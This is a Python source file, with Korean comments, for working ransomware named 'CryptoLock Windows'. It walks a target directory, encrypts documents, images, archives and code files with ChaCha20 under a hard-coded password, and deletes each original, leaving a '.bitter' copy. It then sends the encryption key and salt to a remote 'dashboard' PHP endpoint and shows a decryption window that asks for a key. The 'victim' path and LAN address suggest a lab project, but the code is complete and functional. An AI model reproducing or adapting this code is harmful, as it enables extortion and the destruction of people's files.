#!/usr/bin/env python3
import subprocess
import sys
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests 
try:
    from Crypto.Cipher import ChaCha20
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
    from Crypto.Cipher import ChaCha20  # 설치 후 다시 임포트
try:
    from PIL import Image, ImageTk
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow"])
    from PIL import Image, ImageTk

import sys, struct, base64, uuid, json, requests, logging, os
from datetime import datetime
from Crypto.Cipher import ChaCha20
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import messagebox, ttk
from PIL import Image, ImageTk

# 자동 설치
def install_pycryptodome():
    try:
        from Crypto.Cipher import ChaCha20
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
install_pycryptodome()

# 경로 및 설정
HOME_DIR = "D:\\victim"
MACHINE_ID_PATH = os.path.join(HOME_DIR, "Machine_id.txt")
DASHBOARD_URL = 'http://192.168.1.104/prjrans/includes/api/receive_key.php'
EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx', '.py', '.sql', '.jpeg']

# 로그 설정
logging.basicConfig(filename='encryption_log.txt', level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s')

class ChaCha20Encryptor:
    def __init__(self, password, dashboard_url):
        self.password = password
        self.dashboard_url = dashboard_url
        self.machine_id = str(uuid.uuid4())

        self.salt = get_random_bytes(16)
        self.key = PBKDF2(password.encode(), self.salt, dkLen=32, count=1000000)

    def encrypt_file(self, in_filename):
        try:
            nonce = get_random_bytes(8)
            cipher = ChaCha20.new(key=self.key, nonce=nonce)

            with open(in_filename, 'rb') as infile:
                data = infile.read()
            encrypted_data = cipher.encrypt(data)

            with open(in_filename + '.bitter', 'wb') as outfile:
                outfile.write(struct.pack('<Q', len(data)))
                outfile.write(self.salt)  # ✅ 반드시 self.salt
                outfile.write(nonce)
                outfile.write(encrypted_data)

            os.remove(in_filename)
            logging.info(f"Encrypted: {in_filename}")
        except Exception as e:
            logging.error(f"Failed to encrypt {in_filename}: {e}")



    def encrypt_directory(self, path):
        for root, _, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in EXTENSIONS_TO_ENCRYPT):
                    self.encrypt_file(os.path.join(root, file))

    def send_key_to_dashboard(self):
        payload = {
            'machine_id': self.machine_id,
            'encryption_key': base64.b64encode(self.key).decode(),
            'salt': base64.b64encode(self.salt).decode()
            }
        try:
            res = requests.post(self.dashboard_url, json=payload)
            if res.ok: logging.info("Key sent to dashboard.")
            else: logging.warning(f"Dashboard error: {res.status_code}")
        except Exception as e:
            logging.error(f"Dashboard send failed: {e}")

    def save_machine_id(self):
        try:
            with open(MACHINE_ID_PATH, 'w') as f: f.write(self.machine_id)
            logging.info(f"Machine ID saved to {MACHINE_ID_PATH}")
        except Exception as e:
            logging.error(f"Machine ID save failed: {e}")

def decrypt_file(password, filepath):
    try:
        with open(filepath, 'rb') as f:
            origsize = struct.unpack('<Q', f.read(8))[0]
            salt = f.read(16)
            nonce = f.read(8)
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
            cipher = ChaCha20.new(key=key, nonce=nonce)
            decrypted = cipher.decrypt(f.read())

        with open(filepath.rsplit(".bitter", 1)[0], 'wb') as f:
            f.write(decrypted[:origsize])

        os.remove(filepath)
        return True
    except Exception as e:
        logging.error(f"Decryption failed: {filepath} - {e}")
        return False


# 리소스 경로
def resource_path(relative_path):
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), relative_path)

ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")

class DecryptorApp(tk.Tk):
    def __init__(self):
        super().__init__()
        try:
            self.iconbitmap(ICON_PATH)
        except: pass
        self.title("CryptoLock Windows")
        self.geometry("900x800")
        self.configure(bg='black')
        self.setup_ui()

    def setup_ui(self):
        logo = Image.open(LOGO_PATH).resize((200, 200))
        logo_photo = ImageTk.PhotoImage(logo)
        frame = tk.Frame(self, bg='black')
        frame.pack(pady=20)
        tk.Label(frame, image=logo_photo, bg='black').pack()
        self.logo_photo = logo_photo  # prevent GC

        self.key_entry = tk.Entry(self, font=('Helvetica', 12))
        self.key_entry.pack(fill=tk.X, padx=20, pady=10, ipady=6)

        tk.Button(self, text="Start Decryption", font=('Helvetica', 12),
                  command=self.start_decryption, bg='red', fg='white').pack(pady=10)

        self.log_box = tk.Listbox(self, bg='black', fg='lime', font=('Courier', 10), height=15)
        self.log_box.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        self.progress = ttk.Progressbar(self, orient="horizontal", length=500, mode="determinate")
        self.progress.pack(pady=10)

    def start_decryption(self):
        password = self.key_entry.get().strip()
        if not password:
            messagebox.showerror("Error", "Please enter decryption key.")
            return

        drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        files = []
        for drive in drives:
            for root, _, filenames in os.walk(drive):
                for f in filenames:
                    if f.endswith(".bitter"):
                        files.append(os.path.join(root, f))

        total = len(files)
        self.progress["maximum"] = total
        success = 0

        for idx, f in enumerate(files, 1):
            if decrypt_file(password, f):
                self.log_box.insert(tk.END, f"Decrypted: {f}")
                success += 1
            else:
                self.log_box.insert(tk.END, f"Failed: {f}")
            self.progress["value"] = idx
            self.update_idletasks()

        if success == total:
            messagebox.showinfo("Success", "All files decrypted!")
        else:
            messagebox.showwarning("Partial", f"{success}/{total} files decrypted.")

if __name__ == "__main__":
    if not os.path.exists(MACHINE_ID_PATH):
        tool = ChaCha20Encryptor("PleaseGiveMeMoney", DASHBOARD_URL)
        tool.encrypt_directory(HOME_DIR)
        tool.save_machine_id()
        tool.send_key_to_dashboard()
    app = DecryptorApp()
    app.mainloop()
